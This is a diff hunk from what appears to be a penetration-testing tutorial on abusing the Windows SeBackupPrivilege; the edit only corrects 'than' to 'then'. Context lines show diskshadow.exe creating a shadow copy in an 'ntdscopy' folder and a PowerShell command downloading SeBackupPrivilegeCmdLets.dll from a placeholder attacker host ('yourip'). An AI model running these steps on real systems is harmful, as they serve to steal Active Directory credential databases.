@@ -35,7 +35,7 @@ diskshadow.exe /s C:\temp\ntdscopy\shad.txt
 
 ![Image](/img/sebackup_and_serestore/5.png)
 
-than
+then
 
 ```
 powershell.exe Invoke-WebRequest "http://yourip/SeBackupPrivilegeCmdLets.dll -OutFile ./SeBackupPrivilegeCmdLets.dll"
